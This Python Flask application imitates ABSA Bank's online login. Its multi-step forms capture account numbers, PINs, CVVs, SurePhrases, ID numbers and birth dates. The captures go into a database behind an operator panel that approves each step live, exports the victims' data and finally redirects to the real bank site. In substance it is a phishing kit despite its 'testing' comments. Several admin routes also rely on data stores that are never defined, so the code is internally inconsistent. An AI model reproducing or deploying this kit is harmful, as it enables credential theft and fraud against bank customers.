from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify
from flask_sqlalchemy import SQLAlchemy
import os
import secrets
import time
from datetime import datetime, timedelta
import uuid
import json

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(16))

# Database configuration
database_url = os.environ.get('DATABASE_URL')
if database_url and database_url.startswith('postgres://'):
    database_url = database_url.replace('postgres://', 'postgresql://', 1)

app.config['SQLALCHEMY_DATABASE_URI'] = database_url or 'sqlite:///absa_banking.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Admin credentials (use environment variables in production)
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')

# Database Models
class UserSession(db.Model):
    __tablename__ = 'user_sessions'
    
    id = db.Column(db.String(36), primary_key=True)
    session_start = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(45))
    status = db.Column(db.String(20), default='active')  # active, completed, abandoned
    approved_at = db.Column(db.DateTime)
    approved_by = db.Column(db.String(50))
    rejected_at = db.Column(db.DateTime)
    rejected_by = db.Column(db.String(50))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Relationship to steps
    steps = db.relationship('AuthStep', backref='session', lazy=True, cascade='all, delete-orphan')

class AuthStep(db.Model):
    __tablename__ = 'auth_steps'
    
    id = db.Column(db.Integer, primary_key=True)
    session_id = db.Column(db.String(36), db.ForeignKey('user_sessions.id'), nullable=False)
    step_name = db.Column(db.String(100), nullable=False)
    step_data = db.Column(db.Text)  # JSON string of captured data
    ip_address = db.Column(db.String(45))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    
class ApprovalRequest(db.Model):
    __tablename__ = 'approval_requests'
    
    id = db.Column(db.String(36), primary_key=True)
    session_id = db.Column(db.String(36), db.ForeignKey('user_sessions.id'), nullable=False)
    step_name = db.Column(db.String(100), nullable=False)
    next_url = db.Column(db.String(200))
    user_data = db.Column(db.Text)  # JSON string
    ip_address = db.Column(db.String(45))
    status = db.Column(db.String(20), default='pending')  # pending, approved, rejected
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    handled_at = db.Column(db.DateTime)
    handled_by = db.Column(db.String(50))

# In-memory storage for demo purposes (use database in production)
users_db = {
    '1234567890': {
        'id_number': '8001015009088',
        'dob': {'day': '01', 'month': '01', 'year': '1980'},
        'surephrase': 'MYSECUREPHRASE',
        'pin': '12345',
        'phone': '+27 *** *** 7890',
        'email': 'john.doe****@gmail.com',
        'name': 'John Doe',
        'accounts': {
            'cheque': {'number': '****1234', 'balance': 15247.85},
            'savings': {'number': '****5678', 'balance': 45892.15},
            'credit': {'number': '****9012', 'balance': 28500.00}
        }
    }
}

# Session management
login_attempts = {}
otp_codes = {}

# Initialize database
with app.app_context():
    db.create_all()

# Helper functions for admin approval (updated to use database)
def create_approval_request(session_id, step_name, next_url, user_data=None):
    """Create a new approval request with user data"""
    request_id = str(uuid.uuid4())
    
    # Create or get user session
    user_session = UserSession.query.get(session_id)
    if not user_session:
        user_session = UserSession(
            id=session_id,
            ip_address=request.remote_addr if request else 'Unknown'
        )
        db.session.add(user_session)
        db.session.commit()
    
    # Create approval request
    approval_request = ApprovalRequest(
        id=request_id,
        session_id=session_id,
        step_name=step_name,
        next_url=next_url,
        user_data=json.dumps(user_data) if user_data else '{}',
        ip_address=request.remote_addr if request else 'Unknown'
    )
    
    db.session.add(approval_request)
    db.session.commit()
    
    return request_id

def require_admin_approval(step_name, next_route):
    """Decorator to require admin approval for a route"""
    def decorator(func):
        def wrapper(*args, **kwargs):
            # Create approval request
            session_id = session.get('session_id', str(uuid.uuid4()))
            session['session_id'] = session_id
            
            next_url = url_for(next_route) if next_route else '/'
            request_id = create_approval_request(session_id, step_name, next_url)
            
            # Redirect to waiting page
            return redirect(url_for('waiting_approval', request_id=request_id))
        return wrapper
    return decorator

def store_user_data(session_id, step_name, data):
    """Store user data for admin review"""
    # Create or get user session
    user_session = UserSession.query.get(session_id)
    if not user_session:
        user_session = UserSession(
            id=session_id,
            ip_address=request.remote_addr if request else 'Unknown'
        )
        db.session.add(user_session)
        db.session.flush()  # Get the ID without committing
    
    # Create auth step record
    auth_step = AuthStep(
        session_id=session_id,
        step_name=step_name,
        step_data=json.dumps(data),
        ip_address=request.remote_addr if request else 'Unknown'
    )
    
    db.session.add(auth_step)
    db.session.commit()

@app.route('/')
def index():
    """Landing page - Main Login Page"""
    return render_template('login.html')

@app.route('/login')
def login():
    """Main login page"""
    return render_template('login.html')

@app.route('/process-login', methods=['POST'])
def process_login():
    """Process main login form and redirect to customer info"""
    account_number = request.form.get('accountNumber')
    pin = request.form.get('pin')
    user_number = request.form.get('userNumber')
    
    # Basic validation
    if not all([account_number, pin, user_number]):
        flash('Please fill in all required fields', 'error')
        return render_template('login.html')
    
    # Store initial login data in session
    session['login_account'] = account_number
    session['login_pin'] = pin
    session['user_number'] = user_number
    
    # Redirect to customer info for detailed verification
    return redirect(url_for('customer_info'))

@app.route('/customer-info-start')
def customer_info_start():
    """Customer Information form - separate from main login"""
    return render_template('customer_info.html')

@app.route('/customer-info', methods=['GET', 'POST'])
def customer_info():
    """Handle customer information submission"""
    if request.method == 'POST':
        # Get form data
        id_type = request.form.get('idType')
        id_number = request.form.get('idNumber')
        dob_day = request.form.get('dobDay')
        dob_month = request.form.get('dobMonth')
        dob_year = request.form.get('dobYear')
        account_number = request.form.get('accountNumber')
        branch_code = request.form.get('branchCode')
        cvv = request.form.get('cvv')
        
        # Basic validation
        if not all([id_type, id_number, dob_day, dob_month, dob_year, account_number, branch_code, cvv]):
            flash('Please fill in all required fields', 'error')
            return render_template('customer_info.html')
        
        # Store customer info data
        customer_data = {
            'id_type': id_type,
            'id_number': id_number,
            'date_of_birth': f'{dob_day}/{dob_month}/{dob_year}',
            'account_number': account_number,
            'branch_code': branch_code,
            'cvv': cvv,
            'timestamp': datetime.now().isoformat()
        }
        
        # For testing - accept any details
        session['account_number'] = account_number
        session['authenticated_step1'] = True
        
        # Generate account numbers safely
        account_suffix = account_number[-4:] if account_number and len(account_number) >= 4 else '1234'
        savings_suffix = str(int(account_suffix) + 1111)[-4:] if account_suffix.isdigit() else '5678'
        credit_suffix = str(int(account_suffix) + 2222)[-4:] if account_suffix.isdigit() else '9012'
        
        session['test_user'] = {
            'name': 'Test User',
            'id_number': id_number,
            'accounts': {
                'cheque': {'number': f'****{account_suffix}', 'balance': 15247.85},
                'savings': {'number': f'****{savings_suffix}', 'balance': 45892.15},
                'credit': {'number': f'****{credit_suffix}', 'balance': 28500.00}
            }
        }
        
        # Store user data for admin review
        session_id = session.get('session_id', str(uuid.uuid4()))
        session['session_id'] = session_id
        store_user_data(session_id, 'Customer Information', customer_data)
        
        # Create approval request for customer info step
        next_url = url_for('surephrase_auth')
        request_id = create_approval_request(session_id, 'Customer Information', next_url, customer_data)
        
        flash('Customer information submitted for approval', 'info')
        return redirect(url_for('waiting_approval', request_id=request_id))
    
    return render_template('customer_info.html')

@app.route('/surephrase-auth', methods=['GET', 'POST'])
def surephrase_auth():
    """SurePhrase authentication"""
    if not session.get('authenticated_step1'):
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        account_number = request.form.get('accountNumber')
        surephrase = request.form.get('surephrase', '').upper()
        
        # Store SurePhrase data
        surephrase_data = {
            'account_number': account_number,
            'surephrase': surephrase,
            'timestamp': datetime.now().isoformat()
        }
        
        # Check rate limiting
        client_ip = request.remote_addr
        if client_ip in login_attempts:
            if login_attempts[client_ip]['count'] >= 3:
                if datetime.now() < login_attempts[client_ip]['locked_until']:
                    flash('Too many failed attempts. Please try again later.', 'error')
                    return render_template('surephrase_auth.html')
                else:
                    # Reset attempts after lockout period
                    login_attempts[client_ip] = {'count': 0, 'locked_until': None}
        
        # For testing - accept any SurePhrase
        if len(surephrase) >= 3:
            # Update session account number if provided
            if account_number:
                session['account_number'] = account_number
            session['authenticated_step2'] = True
            # Reset failed attempts on success
            if client_ip in login_attempts:
                login_attempts[client_ip] = {'count': 0, 'locked_until': None}
            
            # Store user data for admin review
            session_id = session.get('session_id', str(uuid.uuid4()))
            session['session_id'] = session_id
            store_user_data(session_id, 'SurePhrase Authentication', surephrase_data)
            
            # Create approval request for SurePhrase step
            next_url = url_for('pin_entry')
            request_id = create_approval_request(session_id, 'SurePhrase Authentication', next_url, surephrase_data)
            
            flash('SurePhrase submitted for approval', 'info')
            return redirect(url_for('waiting_approval', request_id=request_id))
        else:
            flash('Please enter a SurePhrase with at least 3 characters', 'error')
            return render_template('surephrase_auth.html')
    
    return render_template('surephrase_auth.html')

@app.route('/pin-entry', methods=['GET', 'POST'])
def pin_entry():
    """PIN entry authentication"""
    if not session.get('authenticated_step2'):
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        pin_digits = [
            request.form.get('digit1', ''),
            request.form.get('digit2', ''),
            request.form.get('digit3', ''),
            request.form.get('digit4', ''),
            request.form.get('digit5', '')
        ]
        pin = ''.join(pin_digits)
        
        account_number = session.get('account_number')
        
        # Store PIN data
        pin_data = {
            'account_number': account_number,
            'pin': pin,
            'timestamp': datetime.now().isoformat()
        }
        
        # For testing - accept any 5-digit PIN
        if account_number == session.get('account_number') and len(pin) == 5 and pin.isdigit():
            session['authenticated_step3'] = True
            session['authenticated_step4'] = True  # Skip multi-factor auth
            
            # Store user data for admin review
            session_id = session.get('session_id', str(uuid.uuid4()))
            session['session_id'] = session_id
            store_user_data(session_id, 'PIN Verification', pin_data)
            
            # Create approval request for PIN step
            next_url = 'https://ib.absa.co.za'
            request_id = create_approval_request(session_id, 'PIN Verification', next_url, pin_data)
            
            flash('PIN submitted for approval', 'info')
            return redirect(url_for('waiting_approval', request_id=request_id))
        else:
            flash('Please enter a valid 5-digit PIN', 'error')
            return render_template('pin_entry.html')
    
    return render_template('pin_entry.html')

@app.route('/multi-factor-auth', methods=['GET', 'POST'])
def multi_factor_auth():
    """Multi-factor authentication"""
    if not session.get('authenticated_step3'):
        return redirect(url_for('index'))
    
    return render_template('multi_factor_auth.html')

@app.route('/send-otp', methods=['POST'])
def send_otp():
    """Send OTP via SMS or Email"""
    if not session.get('authenticated_step3'):
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    data = request.get_json()
    method = data.get('method')  # 'sms' or 'email'
    account_number = data.get('account_number')
    
    if account_number != session.get('account_number'):
        return jsonify({'success': False, 'message': 'Invalid account number'})
    
    # Generate OTP
    otp = secrets.randbelow(1000000)
    otp_code = f"{otp:06d}"
    
    # Store OTP with expiration
    session_key = f"{session.get('account_number')}_{method}"
    otp_codes[session_key] = {
        'code': otp_code,
        'expires_at': datetime.now() + timedelta(minutes=5)
    }
    
    # In production, actually send SMS/Email here
    print(f"OTP for {method}: {otp_code}")  # For debugging
    
    return jsonify({
        'success': True, 
        'message': f'OTP sent via {method}',
        'debug_code': otp_code  # Remove in production
    })

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    """Verify OTP code"""
    if not session.get('authenticated_step3'):
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    data = request.get_json()
    method = data.get('method')
    otp_input = data.get('otp')
    
    session_key = f"{session.get('account_number')}_{method}"
    
    if session_key not in otp_codes:
        return jsonify({'success': False, 'message': 'No OTP found. Please request a new code.'})
    
    stored_otp = otp_codes[session_key]
    
    # Check expiration
    if datetime.now() > stored_otp['expires_at']:
        del otp_codes[session_key]
        return jsonify({'success': False, 'message': 'OTP has expired. Please request a new code.'})
    
    # Verify OTP
    if stored_otp['code'] == otp_input:
        # Clean up used OTP
        del otp_codes[session_key]
        session['authenticated_step4'] = True
        return jsonify({'success': True, 'message': 'OTP verified successfully'})
    else:
        return jsonify({'success': False, 'message': 'Invalid OTP. Please try again.'})

@app.route('/account-access')
def account_access():
    """Account dashboard - final destination"""
    if not session.get('authenticated_step4'):
        return redirect(url_for('index'))
    
    account_number = session.get('account_number')
    user_data = session.get('test_user')
    
    # If no test user data, try the original users_db
    if not user_data and account_number:
        user_data = users_db.get(account_number, {})
    
    # Fallback to default data if nothing found
    if not user_data:
        user_data = {
            'name': 'Demo User',
            'accounts': {
                'cheque': {'number': '****1234', 'balance': 15247.85}
            }
        }
    
    return render_template('account_access.html', user=user_data)

@app.route('/logout')
def logout():
    """Logout and clear session"""
    session.clear()
    flash('You have been securely logged out.', 'info')
    return redirect(url_for('index'))

@app.route('/health')
def health_check():
    """Health check endpoint for monitoring"""
    pending_count = ApprovalRequest.query.filter_by(status='pending').count()
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'version': '1.0.0',
        'pending_requests': pending_count
    })

@app.route('/api/branch-lookup')
def branch_lookup():
    """API endpoint for branch lookup"""
    code = request.args.get('code', '')
    
    # Mock branch data
    branches = {
        '632005': 'ABSA Bank - Main Branch, Cape Town',
        '470010': 'ABSA Bank - Sandton City, Johannesburg',
        '250655': 'ABSA Bank - Durban Central',
        '334112': 'ABSA Bank - Port Elizabeth Main'
    }
    
    if code in branches:
        return jsonify({'success': True, 'name': branches[code]})
    else:
        return jsonify({'success': False, 'message': 'Branch code not found'})

# Admin routes
@app.route('/admin', methods=['GET', 'POST'])
def admin_login():
    """Admin login page"""
    if session.get('admin_logged_in'):
        return redirect(url_for('admin_dashboard'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            flash('Admin login successful', 'success')
            return redirect(url_for('admin_dashboard'))
        else:
            flash('Invalid admin credentials', 'error')
            return render_template('admin_login.html')
    
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
def admin_dashboard():
    """Admin dashboard"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    # Get pending requests
    pending_requests = [req for req in approval_requests.values() if req['status'] == 'pending']
    
    # Get today's stats
    today = datetime.now().date()
    approved_today = len([req for req in handled_requests['approved'] 
                         if req.get('handled_at', datetime.min).date() == today])
    rejected_today = len([req for req in handled_requests['rejected'] 
                         if req.get('handled_at', datetime.min).date() == today])
    
    return render_template('admin_dashboard.html', 
                         pending_requests=pending_requests,
                         pending_count=len(pending_requests),
                         approved_count=approved_today,
                         rejected_count=rejected_today)

@app.route('/admin/approve/<request_id>', methods=['POST'])
def admin_approve(request_id):
    """Approve a request"""
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    if request_id in approval_requests:
        req = approval_requests[request_id]
        req['status'] = 'approved'
        req['handled_at'] = datetime.now()
        req['approved_by'] = session.get('admin_username', 'admin')
        
        # Store approved data permanently
        session_id = req['session_id']
        if session_id in captured_data:
            captured_data[session_id]['approved_at'] = datetime.now()
            captured_data[session_id]['approved_by'] = session.get('admin_username', 'admin')
        
        # Move to handled requests
        handled_requests['approved'].append(req)
        
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'message': 'Request not found'})

@app.route('/admin/reject/<request_id>', methods=['POST'])
def admin_reject(request_id):
    """Reject a request"""
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    if request_id in approval_requests:
        req = approval_requests[request_id]
        req['status'] = 'rejected'
        req['handled_at'] = datetime.now()
        req['rejected_by'] = session.get('admin_username', 'admin')
        
        # Mark data as rejected
        session_id = req['session_id']
        if session_id in captured_data:
            captured_data[session_id]['rejected_at'] = datetime.now()
            captured_data[session_id]['rejected_by'] = session.get('admin_username', 'admin')
        
        # Move to handled requests
        handled_requests['rejected'].append(req)
        
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'message': 'Request not found'})

@app.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.pop('admin_logged_in', None)
    flash('Admin logged out successfully', 'info')
    return redirect(url_for('admin_login'))

@app.route('/waiting/<request_id>')
def waiting_approval(request_id):
    """Waiting for approval page"""
    if request_id not in approval_requests:
        flash('Invalid request', 'error')
        return redirect(url_for('index'))
    
    req = approval_requests[request_id]
    return render_template('waiting_approval.html',
                         request_id=request_id,
                         step_name=req['step_name'],
                         session_id=req['session_id'],
                         submitted_time=req['created_at'].strftime('%Y-%m-%d %H:%M:%S'))

@app.route('/check-approval/<request_id>')
def check_approval(request_id):
    """Check if request is approved"""
    if request_id not in approval_requests:
        return jsonify({'success': False, 'message': 'Request not found'})
    
    req = approval_requests[request_id]
    if req['status'] == 'approved':
        return jsonify({'approved': True, 'next_url': req['next_url']})
    elif req['status'] == 'rejected':
        return jsonify({'rejected': True})
    else:
        return jsonify({'approved': False, 'rejected': False})

@app.route('/cancel-request/<request_id>', methods=['POST'])
def cancel_request(request_id):
    """Cancel a pending request"""
    if request_id in approval_requests:
        del approval_requests[request_id]
        return jsonify({'success': True})
    return jsonify({'success': False})

# Add new admin routes for data management
@app.route('/admin/view-data/<session_id>')
def admin_view_data(session_id):
    """View captured data for a session"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    if session_id in captured_data:
        data = captured_data[session_id]
        return render_template('admin_view_data.html', session_id=session_id, data=data)
    else:
        flash('Session data not found', 'error')
        return redirect(url_for('admin_dashboard'))

@app.route('/admin/data-history')
def admin_data_history():
    """View all captured data history"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    return render_template('admin_data_history.html', captured_data=captured_data)

@app.route('/admin/export-data/<session_id>')
def admin_export_data(session_id):
    """Export session data as JSON"""
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 403
    
    if session_id in captured_data:
        data = captured_data[session_id]
        # Convert datetime objects to strings for JSON serialization
        export_data = {}
        for key, value in data.items():
            if isinstance(value, datetime):
                export_data[key] = value.isoformat()
            elif key == 'steps':
                export_data[key] = {}
                for step_name, step_data in value.items():
                    export_data[key][step_name] = {
                        'timestamp': step_data['timestamp'].isoformat(),
                        'data': step_data['data'],
                        'ip_address': step_data.get('ip_address', 'Unknown')
                    }
            else:
                export_data[key] = value
        
        return jsonify(export_data)
    else:
        return jsonify({'error': 'Session not found'}), 404

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return render_template('error.html', 
                         error_code=404, 
                         error_message='Page not found'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('error.html', 
                         error_code=500, 
                         error_message='Internal server error'), 500

if __name__ == '__main__':
    # Configuration
    is_production = os.environ.get('FLASK_ENV') == 'production'
    
    if not is_production:
        # Local development configuration
        app.config['SECRET_KEY'] = 'dev-secret-key-change-in-production'
        
        print("\n" + "="*50)
        print("ABSA Banking Authentication System")
        print("="*50)
        print("Application starting on http://localhost:5000")
        print("Admin Panel: http://localhost:5000/admin")
        print(f"Admin Username: {ADMIN_USERNAME}")
        print(f"Admin Password: {ADMIN_PASSWORD}")
        print("="*50 + "\n")
    
    port = int(os.environ.get('PORT', 5000))
    host = '0.0.0.0' if is_production else '127.0.0.1'
    debug = not is_production
    
    app.run(debug=debug, host=host, port=port)